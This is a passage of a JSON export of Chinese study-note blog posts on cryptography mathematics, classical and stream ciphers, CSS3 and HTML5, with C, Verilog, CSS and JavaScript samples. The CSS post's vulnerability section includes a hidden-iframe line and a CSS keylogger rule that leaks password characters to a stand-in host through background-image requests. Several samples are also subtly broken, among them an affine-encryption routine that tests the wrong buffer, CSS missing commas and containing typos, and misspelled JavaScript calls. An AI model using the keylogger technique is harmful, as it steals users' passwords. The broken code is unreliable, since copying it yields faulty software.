$j=1,2,\u0026hellip;,\\frac{p-1}{2}-m(a,p)$.\n显然有 $c_j\\ne p-b_i$, $\\forall i,j$; 否则 $p|b_i+c_j$, 即 $\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $p|a(x+y)$, 但 $x+y\u0026lt;p$, 矛盾.\n故 $a^{\\frac{p-1}{2}}(\\frac{p-1}{2})!\\equiv\\prod c_j \\prod (p-b_i)\\equiv (-1)^{m(a,p)}(\\frac{p-1}{2})!({\\rm mod}\\ p)$.\nEisenstein: $a$ 为奇数时, 记$e(a,p)=\\sum\\lfloor\\frac{ka}{p}\\rfloor$, 有 $e(a,p)\\equiv m(a,p)({\\rm mod}\\ 2)$.\n不妨设 $ka=d_kp+r_k$, $0\\leq r_k\\leq p-1$, $d_k,r_k\\in\\mathbb{Z}$, 有 $p\\sum d_k+\\sum r_k=\\sum ka = \\sum c_j+\\sum (p-b_i)$, 故 $\\sum d_k\\equiv m(a,p)({\\rm mod}\\ 2)$; 显然 $e(a,p)=\\sum d_k$.\n$q\\ne p$ 为奇素数时, $\\not\\exists x,y\\in\\mathbb{Z}$, $x,y\u0026lt;\\frac{p}{2}$ s.t. $xp=qy$, 即 $e(p,q)+e(q,p)=\\frac{p-1}{2}\\frac{q-1}{2}$.\n$a=2$ 时, $\\lfloor\\frac{p}{4}\\rfloor\\leq k\\leq \\lfloor\\frac{p}{2}\\rfloor$, 有 $m=\\lfloor\\frac{p}{2}\\rfloor-\\lfloor\\frac{p}{4}\\rfloor$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int fastLegendre(int a, int p){ int s; int e = 0; if (a == 0 || a == 1){ return a; } else { while (a%2 == 0){ a /= 2; ++e; } if (e%2 == 0 || p%8 == 1 || p%8 == 7){ s = 1; } else { s = -1; } if (p%4 == 3 \u0026amp;\u0026amp; a%4 == 3){ s = -s; } if (a == 1){ return s; } else { return s*fastLegendre(p%a,a); } } } Rabin: 素数 $p\\equiv q\\equiv 3({\\rm mod}\\ 4)$.\n公钥 $n=pq$, 加密 $c\\equiv E_{n}(m)\\equiv m^2({\\rm mod}\\ n)$. 私钥 $(p,q)$, 解密 $m\\equiv D_{p,q}(c)\\equiv \\pm c^{\\frac{p+1}{4}}({\\rm mod}\\ p)\\equiv \\pm c^{\\frac{q+1}{4}}({\\rm mod}\\ q)\\ (2 in 4)$. ","date":"2023-09-05T00:00:00Z","permalink":"https://example.com/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","title":"密码学数学基础"},{"content":"基础 基本属性: 信息机密性, 信息真实性, 数据完整性, 行为不可否认性.\n体制: $(M,C,K_1,K_2,E,D)$ 明文空间, 密文空间, 加密密钥空间, 解密密钥空间, 加密空间, 解密空间; 加密变换 $c=E_{k_1}(m)$, 解密变换 $m=D_{k_2}(c)$.\n类别: 对称加密, 非对称加密, Hash函数, 密码协议.\n分析: 唯密文攻击, 已知明文攻击, 选择明文攻击, 选择密文攻击, 自适应选择明文攻击, 选择密钥攻击.\n评价: 无条件安全 $P(M|C)=P(M)$; 可证明安全(破解本质为数学难题); 计算安全(破解代价超过信息价值;破解时间超过信息时效).\n攻击: 被动攻击(监听-信息机密性); 主动攻击(伪造-信息真实性,篡改-数据完整性,否认-行为不可否认性).\n古典密码 古典密码主要为置换密码和代换密码.\n置换密码: $\\sigma$ 为 $M$ 上一个置换(到自身的双射).\n加密: $(c_i)=E_{k}((m_i))=\\sigma_{k_i}((m_i))$. 解密: $(m_i)=D_{k}((c-i))=\\sigma_{k_i}^{-1}((c_i))$. 代换密码\n加密: $c_i=E_{k}(m_i)\\equiv f(m_i,k)({\\rm mod}\\ 26)$. 解密: $m_i=E_{k}(c_i)\\equiv f^{-1}(c_i,k^{-1})({\\rm mod}\\ 26)$. 单表代换可以直接通过字母频率分析破解.\n1 2 3 4 5 6 7 8 9 10 11 void freqAnalyze(char *ciphertext, long *count){ int num = 0; while (ciphertext[num] != \u0026#39;\\0\u0026#39;){ if (isupper(ciphertext[num])){ count[ciphertext[num]-\u0026#39;A\u0026#39;]++; } else if (islower(ciphertext[num])){ count[ciphertext[num]-\u0026#39;a\u0026#39;]++; } ++num; } } 粗糙度: ${\\rm M.R}=\\sum_{i=0}^25(p_i-\\frac{1}{26})^2=\\sum_{i=0}^25p_i^2-0.0385$. 明文或单表代换时 ${\\rm M.R}\\approx 0.027$, 更接近 $0$ 则更可能为多表代换.\n重合指数: ${\\rm IC}=\\sum_{i=0}^25p_i^2$. 多表代换时 ${\\rm IC}\\approx 0.0655$. 相同字母间隔为 $d_1,\u0026hellip;,d_n$, 则密钥可能长度为 ${\\rm gcd}(d_1,\u0026hellip;,d_n)$.\n仿射密码 单表代换的代表.\n1 2 3 4 5 6 7 8 9 10 11 12 void affineEncrypt(char *plaintext, char *ciphertext, int keyA, int keyB){ long length = strlen(plaintext); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(ciphertext[i])){ ciphertext[i] = (keyA*(plaintext[i]-\u0026#39;A\u0026#39;)+keyB)%26+\u0026#39;A\u0026#39;; } else if (islower(ciphertext[i])){ ciphertext[i] = (keyA*(plaintext[i]-\u0026#39;a\u0026#39;)+keyB)%26+\u0026#39;a\u0026#39;; } else { ciphertext[i] = plaintext[i]; } } } 1 2 3 4 5 6 7 8 9 10 11 12 void affineDecrypt(char *ciphertext, char *plaintext, int keyAReverse, int keyB){ long length = strlen(ciphertext); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(ciphertext[i])){ plaintext[i] = ((keyAReverse*(ciphertext[i]-\u0026#39;A\u0026#39;-keyB))%26+26)%26+\u0026#39;A\u0026#39;; } else if (islower(ciphertext[i])){ plaintext[i] = ((keyAReverse*(ciphertext[i]-\u0026#39;a\u0026#39;-keyB))%26+26)%26+\u0026#39;a\u0026#39;; } else { plaintext[i] = ciphertext[i]; } } } Vernam密码 序列密码的基础.\n自同步序列密码 异或$\\rm XOR$ ($GF(2)$加法) $\\oplus$ 加密: 无条件安全; 可逆.\n与同步序列密码相比, 传输产生的错误有界.\n种子密钥通过LFSR(线性反馈移位寄存器)生成伪随机密钥序列 $k=k_0k_1k_2\u0026hellip;$.\n加密 $c_i=E_{k}(m)=m_i\\oplus k_i$. 解密 $m_i=D_{k}(m)=c_i\\oplus k_i$. LFSR: 状态 $(s_0,s_1,\u0026hellip;,s_{n-1})$, 递推关系式 $s_{n+k}=\\bigoplus g_is_i$, 反馈函数 $f(s_0,s_1,\u0026hellip;,s_{n-1})=\\sum g_is_i$, 连接多项式(特征多项式) $g(x)=\\sum g_ix_i$, $s_i,g_i,x_i\\in GF(2)$.\ne.g. $\\ g(x)=1+x+x^2+x^5$, $s_{5+i}=s_{i}+s_{1+i}+s_{4+i}$. $S_0=(1,0,1,1,1)$, $k=101110111011101110111\u0026hellip;$, $T=8$.\n使用verligo实现LFSR.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 32-bit long module lfsr(32)(clk, reset, lfsr); input clk, reset; output reg [31:0] lfsr; wire d0; xnor(d0, lfsr[31], lfsr[21], lfsr[1], lfsr[0]); always @(posedge clk, posedge reset) begin if(reset) begin lfsr \u0026lt;= 32\u0026#39;h00000001; end else begin lfsr \u0026lt;= {lfsr[30:0], d0}; end end endmodule 定理: $n$ 次特征多项式为 $GF(2^n)$ 上本原多项式时, 输出 $\\max T=2^n-1$ 序列($m$ 序列).\n将 $x^{2^n-1}-1$ 在 $GF(2^n)$ 上因式分解; 保留次数为 $n$ 且不能在 $GF(2^n)$ 上整除 $x^a-1,n\u0026lt;a\u0026lt;2^n-1$ 的因式. 截获长度 $l\\geq 2(2^n-1)$ 的明密文对 $(c,m)$, 则 $k=c\\oplus m$, 有 $S_i,\u0026hellip;,S_{i+n+1}$ 个状态; 记 $X=(S_i,\u0026hellip;,S_n)$, $Y=(S_{i+1},\u0026hellip;,S_{i+n+1})$, 有 $Y\\equiv HX({\\rm mod}\\ 2)$. $m$ 序列时, $X$满秩, $H\\equiv YX^{-1}({\\rm mod}\\ 2)$ 为特征多项式的友矩阵.\n$$H=\\left( \\begin{array}{} 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ \u0026hellip; \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 1 \\\\ g_0 \u0026amp; g_1 \u0026amp; g_2 \u0026amp; \u0026hellip; \u0026amp; g_{n-1} \\end{array}\\right )$$\n可引入非线性运算增加复杂性: 与AND($GF(2)$上乘法) $\\otimes$.\nAD5 RC4 ZUC ","date":"2023-09-04T00:00:00Z","permalink":"https://example.com/p/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","title":"对称加密"},{"content":"Cascading Style Sheets\n基本结构 1 selector, ... {property:value; ... } 继承: Netscape4不支持 格式化: 块级元素, 行内元素\n多重样式 更详细定义 - 继承 重复定义 - 优先级: 同级别下权重大, 同权重下后定义 !important 1-0-0-0-0 内联 1-0-0-0 1 \u0026lt;tag style=\u0026#34;property:value;...\u0026#34;\u0026gt; id选择器 1-0-0 1 #id {property:value; ... } class选择器 0-1-0 1 .class {property:value; ... } property选择器 0-1-0 1 [property=\u0026#34;value\u0026#34;] {property:value; ... } ~= 包含值(完整) |= 以值开头(完整) ^= 匹配以值开头 $= 匹配以值结尾 *= 匹配值\n伪类(pseudo class) 0-1-0 1 :pseudo_class {property:value; ... } active, checked, disabled, empty, enabled, first-child, first-of-type, focus, hover, in-range, invalid, lang, last-child, last-of-type, link, nth-child(n), nth-last-child(n), nth-last-of-type(n), nth-of-type(n), only-of-type, only-child, option, out-of-range, read-only, read-write, required, root, target, valid, visited\ntag选择器 0-0-1 1 tag {property:value; ... } 伪元素(pseudo element) 0-0-1 1 ::pseudo_element {property:value; ... } after, before, first-letter, first-line, selection\n通配符* 关系符, + \u0026gt; ~ \u0026quot;\u0026quot; | | 否定符:not( ) 0-0-0 分组 tag,tag 共同样式 后代 tag tag 包含元素 父子 tag\u0026gt;tag 仅限子元素 相邻 tag+tag 仅对紧邻元素 外部链接 1 2 3 \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;文件名.css\u0026#34;\u0026gt; \u0026lt;\\head\u0026gt; 常用属性 背景: background, -attachment (scroll; fixed; local; initial; inherit), -color, -image, -position, -repeat, -clip, -origin (padding-box; border-box; content-box), -size 字体: @font-face (font-family; src); font, -family, -size, -style (normal; italic; oblique), -variant (normal; small-caps), -weight 文本: color, direction (ltr; rtl), letter-space, line-height, vertical-align, white-space; text-align (left; right; center; justify), -decoration (none; underline; overline; line-through; blink), -indent, -transform (none; capitalize; uppercase; lowercase), -overflow (clip; ellipsis; string), -shadow; word-spacing, -break (normal; break-all; keep-all), -wrap 分页: page-break-after, -before, -inside (auto; always; avoid; left; right) 定位: position (absolute; fixed; relative; static; sticky), bottom, left, right, top, clear (left; right; both; none), clip (shape; auto), cursor (url; default; auto; crosshair; pointer; move; text; wait; help; \u0026hellip;), display (absolute; fixed; relative; static; sticky), float (left; right; none), overflow (visible; hidden; scroll; auto), visibility (visible; hidden; collapse), z-index 网络: grid-column, grid-row Box: box, -shadow, -sizing; overflow, -x/y (no-display; no-content); opacity 外边距: margin, -left/right/top/bottom 轮廓: outline, -color/style/width 边框: border, -left/right/top/bottom, - -color/style/width, -radius 内边距: padding, -left/right/top/bottom 内容: height/width, max/min-height/width 弹性: flex, -grow, -shrink, -basis, -flow, -direction; align, -content, -items (stretch; center; flex-start; flex-end; baseline), -self (space-between; space-evenly; space-around); justify-content, order 列表: list-style, -image, -position (outside; inside), -type (none; disc; circle; squre; decimal; lower-roman; upper-alpha; \u0026hellip;) 多列: columns, conlumn-count, -fill, -gap, -span, -width, -rule, - -color/style/width 表格: border-collapse, -spacing, caption-side, empty-cells, table-layout 生成: content (none; normal; counter; attr; string; open-quote; close-quote; no-open-quote; no-close-quote; url), -increment, -reset; quotes 动画: @keyframes; animation, -name, -duration, -timing-funcion, -delay, -iteration-count, -direction, -play-state 过渡: transition, -property, -duration, -timing-function, -delay 实例: 简单表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;登录界面\u0026lt;\\title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;login.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;用户登录\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;密码\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;登录\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 body { font-family: Arial, sans-serif; } .container { width: 300px; margin: 0 auto; margin-top: 100px; } h1 { text-align: center; } form { margin-top: 30px; } input[type=text] input[type=password] input[type=submit] { display: block; width: 100% padding: 10px margin-bottom: 10xp; } button[type=submit] { background-color: #4CAF50; color: white; } #message { text-align: center; margin-top: 15px; font-weight: bold; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 document.getElementById(\u0026#39;loginForm\u0026#39;).addEventListerner(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); var username = document.getElementById(\u0026#39;username\u0026#39;).value; var password = document.getElementById(\u0026#39;password\u0026#39;).value; var data = { username: username, password: password }; fetch(\u0026#39;/login\u0026#39;, { method: \u0026#39;PUT\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(data) }) .then(function(response) { return responce.text(); }) .then(function(message) { document.getElementById(\u0026#39;message\u0026#39;).textContent = message; }) .catch(function(error) { console.log(error); }) }); 潜在漏洞 iframe transparent 1 \u0026lt;iframe src=\u0026#34;URL\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; keylogger 1 2 3 4 5 \u0026lt;style\u0026gt; input[type=\u0026#34;password\u0026#34;][value$=\u0026#34;a\u0026#34;] { backgroud-image: url(\u0026#34;http//localhost:3000/a\u0026#34;); } \u0026lt;/style\u0026gt; ","date":"2023-08-25T00:00:00Z","permalink":"https://example.com/p/css3/","title":"CSS3"},{"content":"HyperText Markup Language\n基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!doctype html\u0026gt; \u0026lt;!-- 声明为html5文件 --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- html内容 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- 头部元素: 标题, 元数据, 脚本, 样式， icon, 关系 --\u0026gt; \u0026lt;title\u0026gt; \u0026lt;!-- html5中标题必需 --\u0026gt; \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 可见页面内容: 段落, 表单, 链接, 格式, 样式, 程序, 列表, 表格, 框架, 多媒体--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 元素(element): 1 \u0026lt;begin_tag property=\u0026#34;value\u0026#34;; ...\u0026gt; content \u0026lt;/end_tag\u0026gt; 空元素(empty) 1 \u0026lt;tag property=\u0026#34;value\u0026#34;; ... /\u0026gt; 小写文件名, 完整后缀.html 常用标签 基础: !DOCTYPE, html, head, title, body, h1, \u0026hellip;, h6, p, br, hr, !\u0026ndash;\u0026hellip;\u0026ndash; 格式: abbr, b, cite, code, del, i, q, s, small, sup, sub, template, time, u, var, wbr 表单: form, input, textarea, button, select, optgroup, option, label, fieldset, legend, datalist, output 框架: iframe 图像: img, map, area, canvas, figcaption, figure, svg 音视频: audio, source, video 链接: a, link 列表: ul, ol, li, dt, dd 表格: table, caption, th, tr, td, thead, tbody, tfoot, col, colgroup 语义: style, div, span, header, nav, section, article, aside, footer,details, dialog, summary 元信息: base, meta 程序: script, noscript, embed, object 常用属性 全局: class, contenteditable, data-*, dir, draggable, hidden, id, lang, spellcheck, style, tabindex, title html: manifest del: cite, datetime time: datetime form: accept-charset, action, autocomplete (on; off), enctype (application/x-www-form-urlencoded; multipart/form-data; text/plain), method (get; post), name, target (_blank; _parent; _self; _top) input: accept, alt, autocomplete, autofocus, checked, disabled, formaction, formenctype, formmethod, formtarget, height, maxlength, multiple, name, readonly, required, size, src, type (button; checkbox; color; date; datetime; datetime-local; email; file; hidden; image; month; number; password; radio; range; reset; search; submit; tel; text; time; url; week), value, width textarea: autofocus, cols, disabled, maxlength, name, readonly, required, rows, wrap button: autofocus, disabled, formaction, formenctype, formmethod, formtarget, name, type (button; reset; submit), value select: autofocus, disabled, multiple, name, required, size optgroup: disabled, label option: disabled, label, selected, value lable: for iframe: height, name, src, width img: loading (eager; lazy), alt, height, ismap, src, usemap, width area: alt, coords, href, hreflang, media, rel, shape (default; rect; circle; poly), target, type (MIME) canvas: height, width svg: height, width, xmlns (http://www.w3.org/2000/svg), version (1.1; 1.2; 2.0) audio: autoplay, controls, loop, src source: src, type, srcset video: autoplay, controls, height, loop, muted, poster, src, width a: download, href, hreflang, media, rel (altrenate; author; bookmark; help; license; next; nofollow; noreference; prefetch; prev; search; tag), target, type link: href, hreflang, media, rel, type th: colspan, headers, rowspan, scope (col; colgroup; row; rowgroup) td: colspan, headers, rowspan col: span colgroup: span base: href, target meta: charset, content, http-equiv, name script: async, charset, defer, src, type embed: height, src, type, width object: data, height, name, type, usemap, width 字符集 ASCII, utf-8, ISO-8859-1, URL, 实体符号, ISO-639-1\n","date":"2023-08-20T00:00:00Z","permalink":"https://example.com/p/html5/","title":"HTML5"}]